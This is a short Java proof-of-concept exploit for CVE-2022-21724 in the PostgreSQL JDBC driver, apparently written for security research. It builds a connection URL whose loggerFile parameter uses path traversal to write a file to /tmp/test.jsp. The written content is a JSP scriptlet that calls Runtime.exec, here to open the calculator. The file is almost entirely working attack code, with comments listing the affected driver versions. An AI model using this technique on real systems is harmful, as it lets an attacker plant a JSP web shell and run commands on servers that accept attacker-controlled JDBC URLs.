package org.example;

import org.postgresql.Driver;

import java.sql.Connection;
import java.sql.DriverManager;

// CVE-2022-21724 File Write
// Test in MacOS
// OpenJDK 22
// 9.4.1208 <= PgJDBC < 42.2.25
// 42.3.0 <= PgJDBC < 42.3.2
public class PGSQL_FileWrite {
    public static void main(String[] args) throws Exception {
        String fileContent = "\r\n\r\n" + "<%Runtime.getRuntime().exec(\"open -a calculator\")};%>" + "\r\n\r\n";
        String output_path = "../../../../../../../../../tmp/test.jsp";
        String URL = "jdbc:postgresql:///?loggerLevel=DEBUG&loggerFile=" + output_path + "&" + fileContent;
        System.out.println(URL);
        DriverManager.registerDriver(new Driver());
        Connection connection = DriverManager.getConnection(URL);
        connection.close();
    }
}
